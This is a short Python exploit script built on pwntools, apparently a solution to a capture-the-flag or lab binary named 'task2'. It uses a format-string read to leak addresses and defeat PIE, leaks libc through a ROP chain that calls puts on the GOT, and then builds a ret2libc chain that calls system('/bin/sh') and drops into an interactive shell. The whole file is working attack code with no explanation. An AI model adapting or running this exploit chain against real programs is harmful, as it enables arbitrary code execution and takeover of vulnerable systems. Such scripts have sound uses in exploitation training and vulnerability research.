from pwn import *
from pwn import p64

context.log_level = "Error"

pros = process("./task2")
elf = ELF("./task2")
rop = ROP("./task2")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# -------------------------------------------------------------

payload = b"%41$p"
pros.sendline(payload)
pros.recv(29)
addr = int(pros.recvline().strip(), 16)
bin_addr = addr - elf.symbols["_start"]

# -------------------------------------------------------------

payload = b"A" * 0x48
payload += p64(bin_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(bin_addr + elf.got["puts"])
payload += p64(bin_addr + elf.symbols["puts"])
payload += p64(bin_addr + elf.symbols["main"])

pros.sendline(payload)
pros.recvline()
puts_addr = u64(pros.recvline().strip().ljust(8, b"\x00"))
libc_addr = puts_addr - libc_elf.symbols["puts"]

pros.sendline(b"ABC")
# -------------------------------------------------------------

payload = b"A" * 0x48
payload += p64(bin_addr + rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc_addr + next(libc_elf.search(b"/bin/sh")))
payload += p64(bin_addr + rop.find_gadget(["ret"]).address)
payload += p64(libc_addr + libc_elf.symbols["system"])
payload += p64(libc_addr + libc_elf.symbols["exit"])

pros.sendline(payload)
pros.interactive()
